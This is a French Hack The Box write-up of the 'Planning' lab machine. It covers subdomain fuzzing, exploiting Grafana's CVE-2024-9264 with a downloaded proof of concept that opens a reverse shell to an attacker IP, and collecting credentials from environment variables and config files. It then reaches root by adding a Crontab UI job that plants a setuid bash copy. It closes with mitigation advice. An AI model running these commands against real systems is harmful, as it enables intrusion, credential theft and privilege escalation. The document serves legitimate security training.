@@ -1,0 +1,358 @@
+---
+title: Planning
+date: 2025-07-26
+tags: [Remote code execution, privilege-escalation, subdomain-enumeration, port-forwarding]
+draft: false
+summary: Cette machine HTB présente un scénario réaliste où l'attaquant doit découvrir un sous-domaine caché, exploiter une CVE pour RCE puis escalader les privilèges via crontab.
+images: ["/static/images/planning/logo.png"]
+---
+
+# Write-up Complet - Machine Planning HTB
+
+## Informations de la Machine
+
+- **Nom** : Planning
+- **OS** : Linux (Ubuntu 24.04.2 LTS)
+- **Adresse IP** : 10.10.11.68
+- **Identifiants fournis** : admin / 0D5oT70Fq13EvB5r
+
+## Résumé de l'Exploitation
+
+Cette machine HTB présente un scénario réaliste où l'attaquant doit :
+1. Découvrir un sous-domaine caché hébergeant Grafana
+2. Exploiter une CVE récente (CVE-2024-9264) pour RCE
+3. Sortir du conteneur Docker en récupérant des credentials
+4. Escalader les privilèges via une interface web de gestion cron
+
+---
+
+## 1. Reconnaissance
+
+### Scan de Ports
+
+```bash
+nmap -sC -sV 10.10.11.68
+```
+
+**Résultats :**
+- **Port 22** : SSH OpenSSH
+- **Port 80** : HTTP nginx/1.24.0 (Ubuntu)
+
+### Configuration DNS
+
+```bash
+echo "10.10.11.68    planning.htb" >> /etc/hosts
+```
+
+### Énumération Web Initiale
+
+```bash
+feroxbuster -u http://planning.htb -w /usr/share/wordlists/dirb/common.txt -x php,html,txt
+```
+
+**Pages découvertes :**
+- `/index.php` - Page d'accueil avec formulaire de recherche
+- `/enroll.php` - Formulaire d'inscription
+- `/contact.php` - Formulaire de contact
+- `/detail.php`, `/course.php`, `/about.php` - Pages statiques
+
+### Tests de Sécurité sur l'Application Web
+
+#### Formulaires testés :
+1. **Recherche** (`/index.php`) - Paramètre `keyword`
+2. **Inscription** (`/enroll.php`) - Paramètres `full_name`, `email`, `phone`
+3. **Contact** (`/contact.php`) - Formulaire de contact
+
+#### Vulnérabilités testées sans succès :
+- Injection SQL sur tous les formulaires
+- XSS (Cross-Site Scripting)
+- Directory Traversal / LFI
+- Command Injection
+- SSTI (Server-Side Template Injection)
+
+**Conclusion** : L'application web principale n'est pas directement vulnérable.
+
+---
+
+## 2. Découverte du Sous-domaine Critique
+
+### Énumération des Sous-domaines
+
+La clé de cette machine est la découverte d'un sous-domaine caché. Les identifiants fournis par HTB suggèrent un autre point d'entrée.
+
+```bash
+# Découverte avec ffuf
+ffuf -u http://planning.htb -H "Host: FUZZ.planning.htb" \
+  -w /usr/share/seclists/Discovery/DNS/namelist.txt \
+  -fs 178 -t 100
+```
+
+**Résultat crucial :**
+```
+grafana                 [Status: 302, Size: 29, Words: 2, Lines: 3]
+```
+
+### Configuration DNS Mise à Jour
+
+```bash
+echo "10.10.11.68    planning.htb grafana.planning.htb" >> /etc/hosts
+```
+
+---
+
+## 3. Exploitation de Grafana
+
+### Accès à l'Interface Grafana
+
+**URL** : `http://grafana.planning.htb`
+
+**Identifiants** :
+- Username : `admin`
+- Password : `0D5oT70Fq13EvB5r`
+
+### Identification de la Vulnérabilité
+
+**Version découverte** : Grafana v11.0.0
+
+**CVE identifiée** : CVE-2024-9264 - Command injection and local file inclusion via SQL Expressions
+
+### Préparation de l'Exploit
+
+```bash
+# Téléchargement de l'exploit
+wget https://raw.githubusercontent.com/z3k0sec/CVE-2024-9264-RCE-Exploit/main/poc.py
+
+# Setup du listener
+nc -lvnp 9001
+```
+
+### Exécution de l'Exploit
+
+```bash
+python3 poc.py --url http://grafana.planning.htb:80 \
+  --username admin --password 0D5oT70Fq13EvB5r \
+  --reverse-ip 10.10.14.221 --reverse-port 9001
+```
+
+**Résultat** : Shell initial obtenu en tant que `root` dans un conteneur Docker.
+
+---
+
+## 4. Escalade depuis le Conteneur
+
+### Reconnaissance du Conteneur
+
+```bash
+whoami         # root
+hostname       # 7ce659d667d7
+pwd            # /usr/share/grafana
+cat /.dockerenv # Confirme qu'on est dans un conteneur
+```
+
+### Énumération des Variables d'Environnement (CRITIQUE)
+
+```bash
+env | grep -i pass
+env | grep -i GF_
+```
+
+**Découvertes cruciales :**
+```
+GF_SECURITY_ADMIN_PASSWORD=RioTecRANDEntANT!
+GF_SECURITY_ADMIN_USER=enzo
+```
+
+### Évasion du Conteneur
+
+```bash
+# Connexion SSH avec les credentials trouvés
+ssh enzo@10.10.11.68
+# Password: RioTecRANDEntANT!
+```
+
+**Succès** : Accès au système hôte en tant qu'utilisateur `enzo`.
+
+### Récupération du Flag Utilisateur
+
+```bash
+enzo@planning:~$ cat user.txt
+306**************************90e
+```
+
+---
+
+## 5. Escalade de Privilèges vers Root
+
+### Énumération Post-Exploitation
+
+```bash
+# Vérification des privilèges
+sudo -l          # Pas de privilèges sudo
+groups           # enzo
+id               # uid=1000(enzo) gid=1000(enzo) groups=1000(enzo)
+
+# Services internes
+netstat -tulpn | grep 127
+```
+
+**Services internes découverts :**
+- Port 3306 : MySQL
+- Port 3000 : Grafana
+- Port 8000 : Service mystérieux
+- Port 39433 : Service inconnu
+
+### Recherche de Credentials Supplémentaires
+
+```bash
+# Fichiers PHP avec credentials
+find /var/www -name "*.php" -exec grep -l "mysql\|database\|password" {} \;
+```
+
+**Découverte dans `/var/www/web/enroll.php` :**
+```php
+$servername = "localhost"; 
+$username = "root";
+$password = "EXTRapHY"; 
+$dbname = "edukate";
+```
+
+### Analyse des Tâches Cron
+
+```bash
+cat /opt/crontabs/crontab.db
+```
+
+**Contenu critique :**
+```json
+{
+  "name":"Grafana backup",
+  "command":"/usr/bin/docker save root_grafana -o /var/backups/grafana.tar && /usr/bin/gzip /var/backups/grafana.tar && zip -P P4ssw0rdS0pRi0T3c /var/backups/grafana.tar.gz.zip /var/backups/grafana.tar.gz && rm /var/backups/grafana.tar.gz",
+  "schedule":"@daily"
+}
+{
+  "name":"Cleanup",
+  "command":"/root/scripts/cleanup.sh",
+  "schedule":"* * * * *"
+}
+```
+
+**Mots de passe trouvés :**
+- `EXTRapHY` (MySQL root)
+- `P4ssw0rdS0pRi0T3c` (ZIP backup)
+
+### Test du Service Port 8000
+
+```bash
+# Tests d'authentification Basic
+curl -v http://root:P4ssw0rdS0pRi0T3c@localhost:8000
+```
+
+**SUCCÈS** : Accès à une interface **Crontab UI** !
+
+### Exploitation de Crontab UI
+
+**Interface découverte :** Interface web de gestion des tâches cron accessible sur le port 8000
+
+**Méthode d'escalade :**
+
+#### Port Forwarding + Interface Web
+```bash
+# Sur votre machine locale
+ssh -L 8000:localhost:8000 enzo@10.10.11.68
+
+# Accès web
+http://localhost:8000/
+# Identifiants : root / P4ssw0rdS0pRi0T3c
+```
+
+**Configuration de la tâche malveillante :**
+- **Name :** RootShell
+- **Command :** `cp /bin/bash /tmp/rootbash && chmod +s /tmp/rootbash`
+- **Schedule :** `* * * * *` (chaque minute)
+- **Actions :** Save to crontab → Run now
+
+![cronjob](/static/images/planning/cronjobs_new.png)
+
+### Obtention du Shell Root
+
+```bash
+# Attendre l'exécution de la tâche (max 1 minute)
+/tmp/rootbash -p
+
+# Vérification
+whoami    # root
+```
+
+### Récupération du Flag Root
+
+```bash
+cat /root/root.txt
+b2b**************************c13
+```
+
+---
+
+## 6. Méthodologie et Leçons Apprises
+
+### Points Clés de l'Exploitation
+
+1. **Découverte de sous-domaines** : Essential pour trouver des services cachés
+2. **CVE récentes** : Grafana v11.0.0 avec CVE-2024-9264
+3. **Variables d'environnement** : Source critique de credentials dans les conteneurs
+4. **Services internes** : Port 8000 avec interface d'administration mal sécurisée
+5. **Réutilisation de mots de passe** : Credentials trouvés dans différents contextes
+
+### Outils et Techniques Utilisés
+
+- **Reconnaissance** : nmap, feroxbuster, ffuf
+- **Découverte de sous-domaines** : ffuf avec header Host
+- **Exploitation** : CVE-2024-9264 PoC Python
+- **Post-exploitation** : Énumération manuelle, analyse des configurations
+- **Escalade** : Interface web Crontab UI
+
+### Commandes Critiques
+
+```bash
+# Découverte du sous-domaine
+ffuf -u http://planning.htb -H "Host: FUZZ.planning.htb" -w wordlist.txt
+
+# Variables d'environnement (dans le conteneur)
+env | grep -i pass
+
+# Services internes
+netstat -tulpn | grep 127
+
+# Test d'authentification Basic
+curl -v http://user:pass@localhost:port
+```
+
+---
+
+## 7. Mitigation et Recommandations
+
+### Vulnérabilités Identifiées
+
+1. **CVE-2024-9264** : Mise à jour de Grafana requis
+2. **Credentials en clair** : Variables d'environnement exposées
+3. **Interface d'administration** : Authentification faible sur Crontab UI
+4. **Séparation des privilèges** : Interface cron avec privilèges root
+
+### Recommandations de Sécurité
+
+1. **Mise à jour** : Maintenir Grafana à jour
+2. **Secrets management** : Utiliser des gestionnaires de secrets sécurisés
+3. **Authentification forte** : Multi-facteur pour les interfaces d'admin
+4. **Principe du moindre privilège** : Limiter les privilèges des services
+5. **Monitoring** : Surveiller les accès aux interfaces sensibles
+
+---
+
+## Conclusion
+
+La machine Planning illustre parfaitement l'importance de :
+- L'énumération complète (sous-domaines, services internes)
+- La veille sur les CVE récentes
+- L'analyse minutieuse des configurations et variables d'environnement
+- La recherche d'interfaces d'administration cachées
+
+Cette machine combine exploitation de vulnérabilités récentes, évasion de conteneur et escalade de privilèges via des services mal configurés, offrant un excellent exercice de pentest réaliste.
